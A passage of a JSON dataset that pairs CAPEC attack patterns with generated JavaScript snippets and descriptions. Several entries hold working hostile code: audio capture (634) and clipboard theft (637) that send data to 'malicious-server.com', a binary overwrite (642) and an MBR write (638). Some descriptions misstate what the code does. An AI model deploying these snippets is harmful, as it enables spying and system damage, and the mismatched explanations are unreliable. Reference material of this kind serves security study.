        "description": "This JavaScript code snippet simulates a cryptographic operation that is vulnerable to hardware fault injection attacks, such as voltage glitches, clock glitches, and electromagnetic fault injection (EM-FI). The `performSensitiveOperation` function performs a simple encryption operation and checks for hardware fault injection using placeholder detection functions (`isVoltageGlitchDetected`, `isClockGlitchDetected`, and `isEMFIDetected`). If any fault injection is detected, the operation is aborted, and an error message is logged. This code represents the main idea of CAPEC-1247, highlighting the importance of detecting and mitigating hardware fault injections to protect sensitive information."
    },
    {
        "capec_id": "625",
        "capec_name": "Mobile Device Fault Injection",
        "code_snippet": "class MobileDevice {\n  constructor() {\n    this.secretKey = 'superSecretKey123';\n    this.voltage = 5; // in volts\n    this.clockSpeed = 2.5; // in GHz\n  }\n\n  performCryptographicOperation() {\n    // Simulate a cryptographic operation\n    if (this.voltage < 4.5 || this.clockSpeed < 2.0) {\n      throw new Error('Voltage or clock speed glitch detected!');\n    }\n    return this.secretKey;\n  }\n\n  // Simulate a fault injection attack\n  faultInjectionAttack() {\n    this.voltage = 4.0; // Lower the voltage to induce a fault\n    this.clockSpeed = 1.5; // Lower the clock speed to induce a fault\n    try {\n      const key = this.performCryptographicOperation();\n      console.log('Secret Key:', key);\n    } catch (error) {\n      console.error('Fault injection detected:', error.message);\n    }\n  }\n}\n\nconst device = new MobileDevice();\ndevice.faultInjectionAttack();",
        "description": "This JavaScript code snippet simulates a mobile device performing cryptographic operations and demonstrates a fault injection attack. The `MobileDevice` class contains a secret key and parameters for voltage and clock speed. The `performCryptographicOperation` method checks for voltage and clock speed glitches, throwing an error if anomalies are detected. The `faultInjectionAttack` method simulates a fault injection by lowering the voltage and clock speed, attempting to perform the cryptographic operation, and catching any errors that indicate a fault injection. This code embodies the main idea of CAPEC-1247 and related CWEs by illustrating how improper protection against voltage and clock glitches can lead to the compromise of sensitive information."
    },
    {
        "capec_id": "626",
        "capec_name": "Smudge Attack",
        "code_snippet": "document.addEventListener('touchend', function(event) {\n  let touch = event.changedTouches[0];\n  let x = touch.pageX;\n  let y = touch.pageY;\n  console.log('Touch coordinates: (' + x + ', ' + y + ')');\n  // Simulate storing touch coordinates which could be used to infer patterns\n  localStorage.setItem('lastTouch', JSON.stringify({x: x, y: y}));\n});\n\n// Simulate a function that could be exploited to reveal the pattern\nfunction revealPattern() {\n  let lastTouch = JSON.parse(localStorage.getItem('lastTouch'));\n  if (lastTouch) {\n    console.log('Last touch coordinates: (' + lastTouch.x + ', ' + lastTouch.y + ')');\n    // Potentially reveal sensitive information\n  }\n}\n\n// Call the function to demonstrate the vulnerability\nrevealPattern();",
        "description": "This JavaScript code snippet demonstrates a simplified version of a smudge attack on a touchscreen device. The 'touchend' event listener captures the coordinates of the user's touch and stores them in localStorage. The 'revealPattern' function retrieves these coordinates and logs them, simulating how an attacker could exploit this information to infer the user's password or passcode pattern. This example highlights the vulnerability of improper protection of physical side channels (CWE-1300) and excessive attack surface (CWE-1125) by showing how easily accessible touch data can be used to compromise security."
    },
    {
        "capec_id": "627",
        "capec_name": "Counterfeit GPS Signals",
        "code_snippet": "const gpsReceiver = { position: { lat: 0, lon: 0 }, time: new Date() };\n\nfunction receiveGPSSignal(signal) {\n  // CWE-940: No verification of the source of the GPS signal\n  if (!verifySignalSource(signal)) {\n    console.warn('Unverified GPS signal source');\n    return;\n  }\n\n  // CWE-924: No integrity check of the GPS signal\n  if (!verifySignalIntegrity(signal)) {\n    console.warn('GPS signal integrity compromised');\n    return;\n  }\n\n  // Update GPS receiver with potentially spoofed data\n  gpsReceiver.position.lat = signal.lat;\n  gpsReceiver.position.lon = signal.lon;\n  gpsReceiver.time = signal.time;\n\n  console.log('GPS position updated:', gpsReceiver.position, 'Time:', gpsReceiver.time);\n}\n\nfunction verifySignalSource(signal) {\n  // Placeholder for source verification logic\n  return false; // Simulating failure to verify source\n}\n\nfunction verifySignalIntegrity(signal) {\n  // Placeholder for integrity check logic\n  return false; // Simulating failure to verify integrity\n}\n\n// Simulated counterfeit GPS signal\nconst counterfeitSignal = { lat: 51.5074, lon: -0.1278, time: new Date('2023-10-01T12:00:00Z') };\n\n// Receiving the counterfeit GPS signal\nreceiveGPSSignal(counterfeitSignal);",
        "description": "This JavaScript code snippet simulates a GPS receiver that updates its position and time based on incoming GPS signals. The `receiveGPSSignal` function is designed to process these signals but lacks proper verification of the signal source (CWE-940) and integrity checks (CWE-924). The `verifySignalSource` and `verifySignalIntegrity` functions are placeholders that currently always return false, simulating a failure to verify the authenticity and integrity of the signal. This setup allows an adversary to broadcast counterfeit GPS signals, causing the receiver to update its position and time with potentially spoofed data, embodying the main idea of the CAPEC 'Counterfeit GPS Signals'."
    },
    {
        "capec_id": "628",
        "capec_name": "Carry-Off GPS Attack",
        "code_snippet": "const gpsReceiver = { currentLocation: { lat: 0, lon: 0 }, updateLocation: function(newLat, newLon) { this.currentLocation.lat = newLat; this.currentLocation.lon = newLon; } }; const spoofedSignal = { lat: 10, lon: 10 }; function receiveGPSSignal(signal) { if (verifySignalSource(signal)) { gpsReceiver.updateLocation(signal.lat, signal.lon); } else { console.log('Warning: Unverified GPS signal source!'); } } function verifySignalSource(signal) { // CWE-940: Improper Verification of Source of a Communication Channel // This is a simplified and incorrect verification for demonstration purposes return signal.lat !== undefined && signal.lon !== undefined; } // Simulate receiving a spoofed GPS signal receiveGPSSignal(spoofedSignal); console.log(gpsReceiver.currentLocation);",
        "description": "This JavaScript code snippet simulates a GPS receiver that updates its location based on incoming GPS signals. The `receiveGPSSignal` function is responsible for processing incoming signals and updating the receiver's location if the signal source is verified. However, the `verifySignalSource` function contains a simplified and incorrect verification logic, representing CWE-940 (Improper Verification of Source of a Communication Channel). This vulnerability allows an attacker to spoof GPS signals (CAPEC: Carry-Off GPS Attack), leading the receiver to update its location based on counterfeit signals. The code demonstrates how an attacker can manipulate the receiver's location by broadcasting spoofed signals, exploiting the weak verification mechanism."
    },
    {
        "capec_id": "629",
        "capec_name": "DEPRECATED: Unauthorized Use of Device Resources",
        "code_snippet": "const fs = require('fs');\n\nfunction handleUserInput(input) {\n  // CWE-67: Improper Handling of Windows Device Names\n  if (input.includes('CON') || input.includes('AUX')) {\n    console.log('Invalid input');\n    return;\n  }\n\n  // CWE-863: Incorrect Authorization\n  if (!isAuthorized(input)) {\n    console.log('Unauthorized access');\n    return;\n  }\n\n  // CWE-772: Missing Release of Resource after Effective Lifetime\n  let resource = acquireResource();\n  try {\n    // Process the input\n    console.log('Processing input:', input);\n  } finally {\n    releaseResource(resource);\n  }\n}\n\nfunction isAuthorized(input) {\n  // Simulate an incorrect authorization check\n  return input === 'admin';\n}\n\nfunction acquireResource() {\n  // Simulate resource acquisition\n  return {};\n}\n\nfunction releaseResource(resource) {\n  // Simulate resource release\n  console.log('Resource released');\n}\n\n// Example usage\nhandleUserInput('CON'); // Invalid input\nhandleUserInput('user'); // Unauthorized access\nhandleUserInput('admin'); // Processing input: admin\n",
        "description": "This JavaScript code snippet demonstrates several security weaknesses related to the deprecated CAPEC 'Unauthorized Use of Device Resources'. The code handles user input and checks for Windows device names (CWE-67) to prevent denial of service or information exposure. It performs an authorization check (CWE-863) but does so incorrectly, allowing unauthorized access if the input is not 'admin'. The code also simulates resource management, ensuring resources are released after use (CWE-772). The main idea is to show how improper handling of resources and authorization can lead to vulnerabilities."
    },
    {
        "capec_id": "630",
        "capec_name": "TypoSquatting",
        "code_snippet": "const trustedDomain = 'https://www.example.com';\n\nfunction redirectToDomain(userInput) {\n  const urlPattern = /^https?:\\/\\/(www\\.)?example\\.com(\\/.*)?$/;\n  if (urlPattern.test(userInput)) {\n    window.location.href = userInput;\n  } else {\n    console.error('Invalid URL');\n  }\n}\n\n// Example usage\nconst userInput = 'https://www.examp1e.com'; // TypoSquatting domain\nredirectToDomain(userInput);",
        "description": "This JavaScript code snippet demonstrates a scenario where a web application redirects users based on their input. The `redirectToDomain` function checks if the user-provided URL matches the trusted domain pattern using a regular expression. If the URL does not match, it logs an error. This code snippet embodies the concept of TypoSquatting by showing how a user might be redirected to a malicious domain due to a typo (e.g., 'https://www.examp1e.com' instead of 'https://www.example.com'). The code also highlights CWE-601 (Open Redirect) by showing the potential for redirecting users to untrusted sites, and CWE-697 (Incorrect Comparison) by demonstrating the importance of correctly validating URLs to prevent security issues."
    },
    {
        "capec_id": "631",
        "capec_name": "SoundSquatting",
        "code_snippet": "const trustedDomain = 'trusted-site.com';\nconst userInputDomain = 'trvsted-site.com'; // SoundSquatting domain\n\nfunction redirectToDomain(domain) {\n  if (domain === trustedDomain) {\n    window.location.href = `https://${domain}`;\n  } else {\n    console.log('Untrusted domain detected');\n  }\n}\n\n// Simulate user input\nredirectToDomain(userInputDomain);",
        "description": "This JavaScript code snippet demonstrates a potential SoundSquatting attack. The trusted domain is 'trusted-site.com', but the user input domain is 'trvsted-site.com', which sounds similar but is spelled differently. The function `redirectToDomain` checks if the input domain matches the trusted domain and redirects the user if it does. If the domain does not match, it logs an 'Untrusted domain detected' message. This example highlights the risk of SoundSquatting attacks where users can be misled by similarly sounding domain names. The code also touches on CWE-601 (Open Redirect) by showing how user input can be used to redirect to potentially malicious sites, and CWE-290 (Authentication Bypass by Spoofing) by demonstrating how a spoofed domain could bypass simple checks."
    },
    {
        "capec_id": "632",
        "capec_name": "Homograph Attack via Homoglyphs",
        "code_snippet": "const trustedDomain = 'example.com';\nconst userInput = 'examp1e.com'; // Homoglyph attack: '1' looks like 'l'\n\nfunction isTrustedDomain(input) {\n  const regex = new RegExp(`^${trustedDomain}$`, 'i');\n  return regex.test(input);\n}\n\nif (isTrustedDomain(userInput)) {\n  console.log('Access granted to trusted domain.');\n} else {\n  console.log('Access denied.');\n}",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability to a homograph attack via homoglyphs. The trusted domain is 'example.com', but the user input is 'examp1e.com', where '1' is a homoglyph for 'l'. The function 'isTrustedDomain' uses a regular expression to check if the user input matches the trusted domain. However, the regex is not anchored properly, which could allow malicious or malformed data to slip through (CWE-777). This code snippet highlights the risk of insufficient visual distinction of homoglyphs (CWE-1007) and improper neutralization of invalid characters (CWE-86). The main idea is to show how an adversary can exploit visual similarities in domain names to deceive users and potentially direct them to malicious sites."
    },
    {
        "capec_id": "633",
        "capec_name": "Token Impersonation",
        "code_snippet": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\n// Secret key for JWT\nconst secretKey = 'supersecretkey';\n\n// Middleware to authenticate token\nfunction authenticateToken(req, res, next) {\n  const token = req.headers['authorization'];\n  if (!token) return res.sendStatus(403);\n\n  jwt.verify(token, secretKey, (err, user) => {\n    if (err) return res.sendStatus(403);\n    req.user = user;\n    next();\n  });\n}\n\n// Route to generate token (vulnerable)\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  // Weak authentication: no password check\n  const user = { name: username };\n  const token = jwt.sign(user, secretKey);\n  res.json({ token });\n});\n\n// Protected route\napp.get('/protected', authenticateToken, (req, res) => {\n  res.send(`Hello ${req.user.name}, you have access to this protected route.`);\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a simple Express.js application that uses JSON Web Tokens (JWT) for authentication. The '/login' route generates a token for a user based solely on their username, without any password verification, representing weak authentication (CWE-1390) and improper authentication (CWE-287). The 'authenticateToken' middleware verifies the token for protected routes. This setup is vulnerable to token impersonation attacks (CAPEC- Token Impersonation) because an adversary can easily generate a token by knowing or guessing a username, leading to unauthorized access to protected resources."
    },
    {
        "capec_id": "634",
        "capec_name": "Probe Audio and Video Peripherals",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst { exec } = require('child_process');\n\n// CWE-267: Privilege Defined With Unsafe Actions\nexec('arecord -d 10 /tmp/audio_capture.wav', (err) => {\n  if (err) throw err;\n  console.log('Audio captured');\n\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  const options = {\n    hostname: 'malicious-server.com',\n    port: 80,\n    path: '/upload',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'audio/wav'\n    }\n  };\n\n  const req = http.request(options, (res) => {\n    res.on('data', (d) => {\n      process.stdout.write(d);\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(e);\n  });\n\n  // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n  const audioStream = fs.createReadStream('/tmp/audio_capture.wav');\n  audioStream.pipe(req);\n  audioStream.on('end', () => {\n    req.end();\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a malicious script that captures audio from a system's microphone and transmits it to a remote server. The script uses Node.js to execute a shell command (`arecord`) to record audio for 10 seconds and save it to a temporary file. This action represents CWE-267, where the privilege to execute shell commands is used unsafely. The recorded audio file is then sent to a remote server over HTTP in cleartext, embodying CWE-319. The use of `fs.createReadStream` to read the audio file and pipe it to the HTTP request demonstrates CWE-497, as it exposes sensitive system information (the audio file) to an unauthorized control sphere (the remote server). This code snippet encapsulates the main idea of CAPEC- Probe Audio and Video Peripherals by exploiting audio functionalities to capture and transmit sensitive information."
    },
    {
        "capec_id": "635",
        "capec_name": "Alternative Execution Due to Deceptive Filenames",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst path = require('path');\nconst app = express();\n\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.uploadedFile;\n  let uploadPath = path.join(__dirname, 'uploads', uploadedFile.name);\n\n  // Save the file to the server\n  uploadedFile.mv(uploadPath, (err) => {\n    if (err) return res.status(500).send(err);\n\n    // Check file extension\n    let fileExtension = path.extname(uploadedFile.name).toLowerCase();\n    if (fileExtension === '.exe') {\n      return res.status(400).send('Executable files are not allowed.');\n    }\n\n    res.send('File uploaded!');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework and the express-fileupload middleware to handle file uploads. The main idea of the CAPEC is represented by the potential vulnerability in handling file uploads based on their filenames or extensions. The code checks the file extension after saving the file to the server and rejects executable files (.exe) to prevent malicious code execution. However, this approach is vulnerable to deceptive filenames, as attackers could use alternative extensions or special characters to bypass the check. The code also demonstrates CWE-646 (Reliance on File Name or Extension of Externally-Supplied File) and CWE-73 (External Control of File Name or Path) by relying on the file extension to determine the file's safety and allowing user input to control the file path."
    },
    {
        "capec_id": "636",
        "capec_name": "Hiding Malicious Data or Code within Files",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to hide malicious code in an image file's metadata\nfunction hideMaliciousCode(imagePath, maliciousCode) {\n  const imageData = fs.readFileSync(imagePath);\n  const hiddenData = Buffer.concat([imageData, Buffer.from(maliciousCode)]);\n  fs.writeFileSync(imagePath, hiddenData);\n}\n\n// Example usage\nconst imagePath = path.join(__dirname, 'example.jpg');\nconst maliciousCode = '<script>alert(\"Malicious Code\");</script>';\nhideMaliciousCode(imagePath, maliciousCode);\nconsole.log('Malicious code hidden in image metadata.');",
        "description": "This JavaScript code snippet demonstrates how an attacker might hide malicious code within the metadata of an image file. The `hideMaliciousCode` function reads the image file, appends the malicious code to the image data, and writes it back to the file. This embodies the CAPEC concept of 'Hiding Malicious Data or Code within Files' by leveraging the complex format of files to store additional, potentially harmful data. The related CWEs are represented as follows: CWE-506 (Embedded Malicious Code) is shown by embedding a script within the image file, CWE-219 (Storage of File with Sensitive Data Under Web Root) is implied if the image is stored in a web-accessible directory, CWE-313 and CWE-318 (Cleartext Storage) are represented by storing the malicious script in cleartext, and CWE-515 (Covert Storage Channel) is demonstrated by using the image file's metadata as a covert channel to store the malicious code."
    },
    {
        "capec_id": "637",
        "capec_name": "Collect Data from Clipboard",
        "code_snippet": "document.addEventListener('copy', function(event) {\n  let clipboardData = event.clipboardData || window.clipboardData;\n  let copiedText = clipboardData.getData('text');\n  // Simulate sending the copied text to an unauthorized server\n  fetch('http://malicious-server.com/exfiltrate', {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    },\n    body: JSON.stringify({ data: copiedText })\n  });\n});",
        "description": "This JavaScript code snippet listens for the 'copy' event, which is triggered when a user copies text to the clipboard. When the event occurs, it retrieves the copied text from the clipboard and sends it to a malicious server. This demonstrates the CAPEC concept of 'Collect Data from Clipboard' by showing how an adversary can exploit clipboard functionality to exfiltrate sensitive information. The code also touches on related CWEs, such as CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by sending clipboard data to an unauthorized server, and CWE-318 (Cleartext Storage of Sensitive Information in Executable) by handling sensitive data in cleartext."
    },
    {
        "capec_id": "638",
        "capec_name": "Altered Component Firmware",
        "code_snippet": "const fs = require('fs');\nconst exec = require('child_process').exec;\n\n// CWE-1274: Improper Access Control for Volatile Memory Containing Boot Code\nfunction modifyMBR() {\n  // Read the MBR (Master Boot Record)\n  fs.readFile('/dev/sda', (err, data) => {\n    if (err) throw err;\n\n    // CWE-1193: Power-On of Untrusted Execution Core Before Enabling Fabric Access Control\n    // CWE-1326: Missing Immutable Root of Trust in Hardware\n    // CWE-1220: Insufficient Granularity of Access Control\n    // Modify the MBR to include malicious payload\n    let maliciousMBR = Buffer.from(data);\n    maliciousMBR.write('malicious code', 0, 'utf-8');\n\n    // CWE-1277: Firmware Not Updateable\n    // Write the modified MBR back to the disk\n    fs.writeFile('/dev/sda', maliciousMBR, (err) => {\n      if (err) throw err;\n      console.log('MBR modified successfully');\n    });\n  });\n}\n\n// Execute the function to modify the MBR\nmodifyMBR();",
        "description": "This JavaScript code snippet demonstrates a simplified version of an attack that modifies the Master Boot Record (MBR) of a hard disk drive (HDD) to include malicious code. The code reads the MBR from the disk, modifies it to include a malicious payload, and writes it back to the disk. This embodies the main idea of the CAPEC 'Altered Component Firmware' by showing how an adversary could exploit improperly protected firmware to gain persistence on a system. The related CWEs provide context for the vulnerabilities being exploited, such as improper access control for volatile memory (CWE-1274), enabling untrusted execution cores before access control (CWE-1193), missing immutable root of trust (CWE-1326), insufficient granularity of access control (CWE-1220), and firmware not being updateable (CWE-1277)."
    },
    {
        "capec_id": "639",
        "capec_name": "Probe System Files",
        "code_snippet": "const fs = require('fs');\n\n// Insecurely storing sensitive information in a file\nconst sensitiveData = 'user:password123';\nconst filePath = '/tmp/sensitive_info.txt';\n\n// Writing sensitive data to a file without proper access control\nfs.writeFileSync(filePath, sensitiveData, 'utf8');\n\nconsole.log('Sensitive data written to file:', filePath);",
        "description": "This JavaScript code snippet demonstrates a vulnerability where sensitive information is stored in a file without proper access control. The code writes a string containing sensitive data (e.g., a username and password) to a file located in the '/tmp' directory. This directory is typically accessible to all users on the system, making the sensitive information vulnerable to unauthorized access. This example embodies the main idea of the CAPEC 'Probe System Files' by showing how improperly protected files can lead to unauthorized information disclosure. The related CWEs are represented by the insecure storage location (CWE-552), the use of a temporary file (CWE-377), and the exposure of sensitive information (CWE-497)."
    },
    {
        "capec_id": "640",
        "capec_name": "Inclusion of Code in Existing Process",
        "code_snippet": "const fs = require('fs');\nconst vm = require('vm');\n\n// CWE-829: Including functionality from an untrusted source\nconst untrustedCode = fs.readFileSync('/path/to/untrusted/code.js', 'utf8');\n\n// CWE-913: Improper control of dynamically-managed code resources\nconst sandbox = { process: process, require: require, console: console };\n\ntry {\n  // CWE-114: Process control vulnerability\n  vm.createContext(sandbox);\n  vm.runInContext(untrustedCode, sandbox);\n} catch (e) {\n  console.error('Error executing untrusted code:', e);\n}\n",
        "description": "This JavaScript code snippet demonstrates the inclusion of code in an existing process, which is the main idea of the CAPEC. The code reads and executes a script from an untrusted source using Node.js's 'fs' and 'vm' modules. This represents CWE-829 by including functionality from an untrusted source, CWE-913 by improperly controlling dynamically-managed code resources, and CWE-114 by potentially allowing process control vulnerabilities. The 'vm.runInContext' method executes the untrusted code within a sandboxed environment, but if the sandbox is not properly configured, it can lead to security issues such as arbitrary code execution, privilege escalation, and evasion of detection defenses."
    },
    {
        "capec_id": "641",
        "capec_name": "DLL Side-Loading",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction loadLibrary(libraryName) {\n  const searchPaths = [\n    path.join(__dirname, 'libs'),\n    path.join(__dirname, 'external_libs'),\n    'C:\\Windows\\System32'\n  ];\n\n  for (const searchPath of searchPaths) {\n    const libraryPath = path.join(searchPath, libraryName);\n    if (fs.existsSync(libraryPath)) {\n      console.log(`Loading library from: ${libraryPath}`);\n      return require(libraryPath);\n    }\n  }\n\n  throw new Error('Library not found');\n}\n\n// Example usage\ntry {\n  const myLib = loadLibrary('example.dll');\n  myLib.doSomething();\n} catch (error) {\n  console.error(error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of DLL side-loading. The `loadLibrary` function attempts to load a DLL from a list of predefined search paths. The paths include directories that could be under the control of an attacker, such as 'external_libs'. If an attacker places a malicious DLL named 'example.dll' in one of these directories, the function will load the malicious DLL instead of the legitimate one. This embodies the main idea of CAPEC-471 (DLL Side-Loading) and highlights related weaknesses such as CWE-427 (Uncontrolled Search Path Element) and CWE-426 (Untrusted Search Path). The code does not verify the integrity or authenticity of the DLL, making it susceptible to side-loading attacks."
    },
    {
        "capec_id": "642",
        "capec_name": "Replace Binaries",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Path to the binary that will be replaced\nconst binaryPath = '/usr/local/bin/someBinary';\n\n// Malicious code to replace the binary\nconst maliciousCode = `#!/bin/bash\necho 'Malicious code executed with elevated privileges'\n# Add more malicious commands here\n`;\n\n// Check if the binary exists and has weak permissions\nif (fs.existsSync(binaryPath)) {\n  const stats = fs.statSync(binaryPath);\n  if ((stats.mode & 0o777) !== 0o755) { // Check for weak permissions\n    // Replace the binary with malicious code\n    fs.writeFileSync(binaryPath, maliciousCode, { mode: 0o755 });\n    console.log('Binary replaced with malicious code');\n  } else {\n    console.log('Binary has secure permissions');\n  }\n} else {\n  console.log('Binary does not exist');\n}",
        "description": "This JavaScript code snippet demonstrates a potential vulnerability where an attacker replaces a binary with malicious code due to weak file permissions. The code checks if a specific binary exists and if it has weak permissions (not set to 755). If the permissions are weak, it replaces the binary with a malicious script. This embodies the CAPEC 'Replace Binaries' by showing how an attacker can exploit incorrect permission assignments (CWE-732) to replace critical binaries with malicious code (CWE-506). The code also highlights the importance of proper file permissions to prevent such attacks."
    },
    {
        "capec_id": "643",
        "capec_name": "Identify Shared Files/Directories on System",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to list shared directories\nfunction listSharedDirectories(basePath) {\n  try {\n    const files = fs.readdirSync(basePath);\n    files.forEach(file => {\n      const filePath = path.join(basePath, file);\n      const stats = fs.statSync(filePath);\n      if (stats.isDirectory()) {\n        console.log(`Shared Directory: ${filePath}`);\n      }\n    });\n  } catch (err) {\n    console.error('Error reading directory:', err);\n  }\n}\n\n// Example usage\nconst sharedBasePath = '\\\\UNC\\share\\name\\';\nlistSharedDirectories(sharedBasePath);",
        "description": "This JavaScript code snippet demonstrates how an adversary might identify shared directories on a system by reading a specified base path (in this case, a Windows UNC share path). The `listSharedDirectories` function reads the contents of the given base path and logs any directories it finds. This embodies the CAPEC's main idea of discovering shared files/directories to locate sensitive information or map potential routes for lateral movement. The code also touches on related CWEs, such as CWE-40 (Path Traversal) by accepting a UNC path, CWE-552 (Files or Directories Accessible to External Parties) by potentially exposing directory names, and CWE-200 (Exposure of Sensitive Information) by logging directory paths."
    },
    {
        "capec_id": "644",
        "capec_name": "Use of Captured Hashes (Pass The Hash)",
        "code_snippet": "const crypto = require('crypto');\nconst net = require('net');\n\n// Simulate storing password hashes\nconst storedHashes = {\n  'user1': '5f4dcc3b5aa765d61d8327deb882cf99' // MD5 hash for 'password'\n};\n\n// Simulate a client sending a hash for authentication\nconst clientHash = '5f4dcc3b5aa765d61d8327deb882cf99'; // MD5 hash for 'password'\n\n// Server-side authentication check\nfunction authenticate(hash) {\n  for (let user in storedHashes) {\n    if (storedHashes[user] === hash) {\n      return true;\n    }\n  }\n  return false;\n}\n\n// Simulate network communication\nconst server = net.createServer((socket) => {\n  socket.on('data', (data) => {\n    const receivedHash = data.toString();\n    if (authenticate(receivedHash)) {\n      socket.write('Authentication successful');\n    } else {\n      socket.write('Authentication failed');\n    }\n  });\n});\n\nserver.listen(1337, '127.0.0.1');\n\n// Simulate an attacker capturing and replaying the hash\nconst client = new net.Socket();\nclient.connect(1337, '127.0.0.1', () => {\n  client.write(clientHash); // Replay the captured hash\n});\n\nclient.on('data', (data) => {\n  console.log('Server response: ' + data.toString());\n  client.destroy(); // Close the connection\n});",
        "description": "This JavaScript code snippet demonstrates a simplified version of the 'Use of Captured Hashes (Pass The Hash)' attack. The server stores password hashes and authenticates clients by comparing received hashes with stored ones. An attacker captures a legitimate hash and replays it to the server, successfully bypassing authentication. This example highlights vulnerabilities such as 'Insufficiently Protected Credentials' (CWE-522), 'Use of Password Hash Instead of Password for Authentication' (CWE-836), and 'Authentication Bypass by Capture-replay' (CWE-294). The code also implicitly shows the risk of 'Use of Single-factor Authentication' (CWE-308) as it relies solely on hash comparison for authentication."
    },
    {
        "capec_id": "645",
        "capec_name": "Use of Captured Tickets (Pass The Ticket)",
        "code_snippet": "const net = require('net');\n\n// Simulate a captured Kerberos ticket\nconst capturedTicket = 'captured_ticket_data';\n\n// Create a client to replay the captured ticket\nconst client = new net.Socket();\nclient.connect(88, 'target_kerberos_server', () => {\n  console.log('Connected to Kerberos server');\n  // Send the captured ticket to the server\n  client.write(capturedTicket);\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  // Check if authentication is successful\n  if (data.toString().includes('Authentication Successful')) {\n    console.log('Access granted using captured ticket');\n  }\n  client.destroy(); // Close the connection\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});\n\nclient.on('error', (err) => {\n  console.error('Connection error: ' + err.message);\n});",
        "description": "This JavaScript code snippet demonstrates a simplified version of the 'Use of Captured Tickets (Pass The Ticket)' attack. It simulates the use of a captured Kerberos ticket to authenticate to a Kerberos server. The code creates a network client that connects to a Kerberos server and sends a captured ticket. If the server responds with a successful authentication message, it indicates that the captured ticket was used to gain unauthorized access. This snippet embodies the main idea of the CAPEC by showing how an adversary can use a stolen Kerberos ticket to bypass authentication. The related CWEs are represented by the insecure handling of authentication credentials (CWE-522), the potential for replay attacks (CWE-294), and the lack of multi-factor authentication (CWE-308)."
    },
    {
        "capec_id": "646",
        "capec_name": "Peripheral Footprinting",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\n// Function to check for USB device connections by reading Windows registry\nfunction checkUSBDevices() {\n  const registryPath = 'C:\\\\Windows\\\\System32\\\\config\\\\SYSTEM';\n  try {\n    const data = fs.readFileSync(registryPath, 'utf8');\n    if (data.includes('USBSTOR')) {\n      console.log('USB device detected');\n      // Expose sensitive information\n      console.log('Registry Data:', data);\n    }\n  } catch (err) {\n    console.error('Error reading registry:', err);\n  }\n}\n\ncheckUSBDevices();",
        "description": "This JavaScript code snippet demonstrates a basic example of 'Peripheral Footprinting' by attempting to read the Windows registry to check for connected USB devices. The code reads the SYSTEM registry file and searches for the 'USBSTOR' keyword, which indicates USB storage devices. If found, it logs the entire registry data, exposing potentially sensitive system information. This snippet embodies the CAPEC concept by showing how an adversary might gather information about peripheral devices. It also touches on related CWEs, such as the exposure of sensitive information (CWE-200, CWE-497) and improper handling of system-level data (CWE-67)."
    },
    {
        "capec_id": "647",
        "capec_name": "Collect Data from Registries",
        "code_snippet": "const fs = require('fs');\nconst registryPath = 'C:\\\\path\\\\to\\\\registry\\\\file';\n\n// Read registry file without proper authorization check\nfs.readFile(registryPath, 'utf8', (err, data) => {\n  if (err) {\n    console.error('Error reading registry file:', err);\n    return;\n  }\n  console.log('Registry Data:', data);\n});",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an adversary can read sensitive information from a registry file without proper authorization checks. The code uses Node.js's 'fs' module to read a registry file located at 'C:\\path\\to\\registry\\file'. The lack of authorization checks (CWE-285) allows unauthorized access to potentially sensitive information stored in cleartext (CWE-314). This can lead to exposure of sensitive system information (CWE-497). The code embodies the main idea of CAPEC- Collect Data from Registries, by showing how an adversary might exploit improper authorization to gather sensitive data from a registry."
    },
    {
        "capec_id": "648",
        "capec_name": "Collect Data from Screen Capture",
        "code_snippet": "const fs = require('fs');\nconst screenshot = require('screenshot-desktop');\n\n// Function to capture and save a screenshot\nfunction captureScreen() {\n  screenshot().then((img) => {\n    fs.writeFileSync('screenshot.png', img);\n    console.log('Screenshot saved.');\n  }).catch((err) => {\n    console.error('Error capturing screenshot:', err);\n  });\n}\n\n// Simulate a privileged action that captures the screen\nfunction privilegedAction() {\n  if (userHasPrivilege()) {\n    captureScreen();\n  } else {\n    console.log('User does not have the required privilege.');\n  }\n}\n\n// Dummy function to check user privilege\nfunction userHasPrivilege() {\n  // Insecure privilege check (CWE-267)\n  return true; // Assume user has privilege for demonstration purposes\n}\n\n// Trigger the privileged action\nprivilegedAction();",
        "description": "This JavaScript code snippet demonstrates a scenario where an adversary can exploit the system's screen capture functionality to gather sensitive information. The `captureScreen` function uses the `screenshot-desktop` library to capture and save a screenshot. The `privilegedAction` function simulates a privileged action that captures the screen if the user has the required privilege. The `userHasPrivilege` function contains an insecure privilege check (CWE-267), always returning true for demonstration purposes. This setup can lead to the exposure of sensitive information (CWE-497) if an unauthorized user gains access to this functionality. The code embodies the main idea of CAPEC-Collect Data from Screen Capture by demonstrating how an adversary could exploit screen capture capabilities to gather sensitive information."
    },
    {
        "capec_id": "649",
        "capec_name": "Adding a Space to a File Extension",
